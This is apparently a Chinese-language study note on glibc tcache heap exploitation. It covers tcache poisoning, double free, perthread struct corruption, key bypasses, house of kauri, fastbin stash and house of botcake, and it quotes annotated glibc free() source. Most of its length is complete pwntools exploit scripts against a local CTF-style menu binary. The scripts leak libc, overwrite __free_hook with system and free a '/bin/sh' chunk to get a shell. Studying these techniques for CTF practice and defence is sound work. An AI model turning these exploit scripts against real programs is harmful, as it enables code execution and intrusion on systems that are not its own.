# tcache绕过

## 方法一tcache poisoning

只用tcache poisoning使用tcache中的next，不需要伪造chunk结构体既可以实现malloc的任何地址

但是由于在高版本中加入了tcache中的检查因此我们就不可以进行一个更改了

而这个方法几乎类似于fastbin attch 因此我这里就直接写了一个代码

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0,0x410)
add_chunk(1,0x10)
delete_chunk(0)
show_chunk(0)
p.recv()
libc.address= u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3afca0
info("libc.address: "+hex(libc.address) )
add_chunk(0,0x100)
delete_chunk(0)
edit_chunk(0,p64(libc.sym['__free_hook']))
gdb.attach(p)
pause()

add_chunk(0,0x100)

# gdb.attach(p,"b __libc_malloc\nc")
# add_chunk(0,0x100)
# edit_chunk(0,p64(libc.sym['system']))
# edit_chunk(1,"/bin/sh\x00")
delete_chunk(1)
# gdb.attach(p)

p.interactive()
```

## 方法二tcache dup

二这个方法也就是使用double free是的从而进行一个tcache poisoning

exp

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3afca0
info("libc.address:"+hex(libc.address))

add_chunk(0,0x100)
delete_chunk(0)
# delete_chunk(0)
# add_chunk(0,0x100)
edit_chunk(0,p64(libc.sym['__free_hook']))
gdb.attach(p)
p.interactive()
```

## 方法三tcache perthread corruption

这个方法就是使用tcache perthread corruption来控制整个tcache

而这个tcache的控制器就是在heap+0x10的位置是的我们可以来把他给申请出来进行一个构造所以他的代码

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0,0x410)
add_chunk(1,0x10)

delete_chunk(0)
show_chunk(0)
# gdb.attach(p)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3afca0
info('libc.address:'+hex(libc.address))

add_chunk(0, 0x240)
delete_chunk(0)
delete_chunk(0)
add_chunk(0, 0x240)
show_chunk(0)
p.recv()
heap_base = u64(p.recv(6)[-6:].ljust(8, b'\x00')) & ~0xFFF#在这里我们获取了堆块的地址
info("heap base: " + hex(heap_base))

edit_chunk(0, p64(heap_base + 0x10))
gdb.attach(p)
add_chunk(0, 0x240)
add_chunk(0, 0x240)

edit_chunk(0, p8(7) * 64 + p64(libc.sym['__free_hook']) * 64)

p.interactive()
```

## 方法四 tcache extend

他的主要思路就是修改chunk的size让后释放并重新申请出来后就会形成一个堆重叠

从而来实现一个异类的uaf

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x3afca0
info("libc base: " + hex(libc.address))
# delete_chunk(1)

add_chunk(0, 0x18)
add_chunk(1, 0x10)
add_chunk(2, 0x10)#在这个位置我们申请了3个堆块这里就是我们要构造的一个堆块空间

edit_chunk(0, b'a' * 0x18 + p64(0x100))#在这里堆chunk1进行一个改打处理使得它可以覆盖到下一个chunk位置
delete_chunk(1)

add_chunk(1,0xf8)#并且对他进行一个重新申请使得我们构造的0x100大小的chunk是合法的让后就是去修改chunk2的fd喝bk来构造system
delete_chunk(2)
edit_chunk(1,b'a'*0x20+p64(libc.sym['__free_hook']))
add_chunk(0,0x18)
add_chunk(0,0x18)
edit_chunk(0,p64(libc.sym['system']))

gdb.attach(p)
# delete_chunk(1)
p.interactive()
```

## 方法五house of io

这个方法其实喝tcache_perthread_struct结构体的攻击，想办法将其释放掉，然后再申请出来，申请回来的时候就可以控制整个tcache的分配

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00'))-0x3afca0
info("libc base: " + hex(libc.address))

add_chunk(0,0x240)
delete_chunk(0)
delete_chunk(0)
add_chunk(0,0x240)
show_chunk(0)
p.recv()
head_base = u64(p.recv(6).ljust(8,b'\x00')) &~ 0xfff
info('head_base:'+hex(head_base))


edit_chunk(0,p64(head_base+0x10))

add_chunk(0,0x240)
add_chunk(0,0x240)
gdb.attach(p)
delete_chunk(0)
add_chunk(0,0x240)
edit_chunk(0,p64(libc.sym['__free_hook'])*0x64)

add_chunk(0,0x50)
edit_chunk(0,p64(libc.sym['system']))

add_chunk(1,0x50)
edit_chunk(1,'/bin/sh\x00')
delete_chunk(1)
# gdb.attach(p)

p.interactive()
```

这里其实用的方法喝第三种方法是一样的无非就是多了一步进入了unstortbin的成分所以代码也比较类似

## 方法六 tcache key的绕过之清空key

这里由于再tcache 的key再2.29以后他对tcache进行了一个限制引入了key这个关键词

因此我们这里就要看一下libc的源代码了

```c
#if USE_TCACHE
  {
    // 计算chunk大小对应的tcache bin索引
    // csize2tidx(size)：将chunk大小转换为tcache bin索引
    size_t tc_idx = csize2tidx (size);

    // 检查tcache是否可用
    // tcache != NULL：确保当前线程的tcache已初始化
    // tc_idx < mp_.tcache_bins：确保索引在合法范围内
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
        // 将chunk转换为用户数据区域指针
        // chunk2mem(p)：将chunk指针转换为用户可见的内存地址
        tcache_entry *e = (tcache_entry *) chunk2mem (p);

        // 检查是否可能为double free
        // e->key == tcache：快速检测是否已在tcache中
        // __glibc_unlikely：优化分支预测，标记为低概率事件
        if (__glibc_unlikely (e->key == tcache))
          {
            // 记录double free探测事件
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);

            // 遍历tcache链表验证是否存在重复节点
            tcache_entry *tmp;
            for (tmp = tcache->entries[tc_idx];
                 tmp;
                 tmp = REVEAL_PTR (tmp->next))
              {
                // 检查链表节点是否对齐
                // aligned_OK(tmp)：确保地址符合内存对齐要求
                if (__glibc_unlikely (!aligned_OK (tmp)))
                  malloc_printerr ("free(): unaligned chunk detected in tcache 2");

                // 检查是否为重复节点
                if (__glibc_unlikely (tmp == e))
                  malloc_printerr ("free(): double free detected in tcache 2");

                // 如果执行到这里，说明是巧合匹配，不采取进一步行动
              }
          }

        // 检查当前bin的chunk数量是否未达上限
        if (tcache->counts[tc_idx] < mp_.tcache_count)
          {
            // 将chunk插入tcache链表头部
            tcache_put (p, tc_idx);

            // 释放成功，直接返回
            return;
          }
      }
  }
```

这个就是整个关于tcache再2.35版本的一个源代码但是由于我们知道一点key是在tcache perthread corruption中的因此我们可以进行一个覆盖

但是再2.34之后修复了这个点因此我们2.35也是不能用覆盖的主要原因是key是一个随机数而不是指向tcache perthread corruption的一个数

因此我们用的这个方法就是使用uaf手法把tcache修改掉使得tcache不进入数据他就进不了判断

但是他这个方法再2.34以上的版本就使用不了了

因此这个方法只适用于2.34一下的版本

因此我们使用的脚本为

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - 0x3b6be0
info("libc base: " + hex(libc.address))

add_chunk(10, 0x200)
add_chunk(0, 0x200)
delete_chunk(10)
delete_chunk(0)
edit_chunk(0, p64(0) * 2)#这里的作用就是之前说过的，用来覆盖key的一个值使得我们第二次free的时候使得tcachebin无法找到对应的key地址，使得tcache key绕过，后面就要使用tcache dup的攻击手法了
delete_chunk(0)
gdb.attach(p)
add_chunk(0, 0x200)
edit_chunk(0, p64(libc.sym['__free_hook']))

add_chunk(0, 0x200)
add_chunk(0, 0x200)

edit_chunk(0, p64(libc.sym['system']))

edit_chunk(1,'/bin/sh\x00')
delete_chunk(1)

# gdb.attach(p)
p.interactive()

```

## 方法七 tcache key绕过--hoase of kauri

这个主要的方法方式就是要让我们的同一个chunk块释放两次同时这两次的释放位置是不同的chunk tcache块使得进行一个fastbin attact的一个操作来使得我们得到一个可以执行的权限

代码

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - 0x3b6be0
info("libc base: " + hex(libc.address))
add_chunk(10, 0x18)
add_chunk(0, 0x18)
add_chunk(1, 0x28)

delete_chunk(10)#这里的10块使用来与上面数据进行一个分割的
delete_chunk(1)#这里是使用了一个释放chunk1块
edit_chunk(0, 'a' * 0x18 + p64(0x20))#通过溢出来对释放后的chunk1进行一个size的更改使得他的size位进行一个改变
delete_chunk(1)#再次释放使得同一个chunk进入不同的tcache大小堆块

add_chunk(0, 0x28)
edit_chunk(0, p64(libc.sym['__free_hook']))

add_chunk(0, 0x18)
add_chunk(0, 0x18)
edit_chunk(0, p64(libc.sym['system']))

edit_chunk(1, '/bin/sh\x00')

delete_chunk(1)
# gdb.attach(p)
p.interactive()

```

## 方法八 tcache key绕过 -- tcache stash with fastbin double free

这个方法主要使用了fastbin对double free没有一个严密的检查使得我们可以在fastbin中构造一个double free 让后通过tcache的机制使得我们在fastbin中构造的堆块进入到tcache中去来进行一个绕过

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8,b'\x00'))-0x3b6be0
info("libc.address"+hex(libc.address))

for i in range(9): add_chunk(i,0x30)#在使用这个方法的时候我们可以知道一个前置知识点，就是在tcache中最多放入7个chunk块大于7个的chunk会放入到fastbin和unstortbin中因此我们可以使用这个机制来使得fastbin进行一个构造
for i in range(2, 9): delete_chunk(i)

delete_chunk(0)
delete_chunk(1)
delete_chunk(0)

for i in range(2,9): add_chunk(i,0x30)#这里是让我们创建的double free进入tcachebin 来进行一个tcachebin的一个初始化
#因此我们在这里我们就可以要考虑一个如果把fastbin中的数据进入到tcache中这里我们也是用到了tcache中的一个机制就是当我们创建了一个tcache之外的一个chunk块后他会把整个块全部移动到tcache中（前提tcache中已经进行了一个初始化），这里使用的是stash
add_chunk(0, 0x30)#出发机制

edit_chunk(0, p64(libc.sym['__free_hook']))

add_chunk(0, 0x30)
add_chunk(0, 0x30)
add_chunk(0, 0x30)

edit_chunk(0, p64(libc.sym['system']))
gdb.attach(p)
p.interactive()
```

## 方法九 tcache key 绕过 -- house of botcake

这个主要的用发就是同一个chunk释放到tcache和unsorted bin中。释放在unsortted bin的chunk借助堆块合并改变大小，相对于上一个方法，这个方法的好处是一次double free可以多次使用，因为控制同一块内存的chunk大小不同

但是从我的理解来看他的方法主要使用的一个本质就是通过unsortbin的unlink操作使得我们的数据堆块可以重新放到tcache中去并且由于这个块会放到tcache中去这样我们就可以吧unsortbin中的数据申请出来来控制tcache因此我们的代码就是

```py
from pwn import *

from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x3b6be0
info("libc base: " + hex(libc.address))

for i in range(10): add_chunk(i,0x200)
for i in range(7): delete_chunk(i)

delete_chunk(7)
delete_chunk(8)

# gdb.attach(p)
# pause()
add_chunk(10,0x200)#这里的用处就是让我们的tcache中空闲出一个块来重新释放chunk8
delete_chunk(8)

add_chunk(10, 0x300)#这个是从unsortbin中分割出来控制
# edit_chunk(10, b'a' * 0x210 + p64(libc.sym['__free_hook']))

gdb.attach(p)


p.interactive()
```





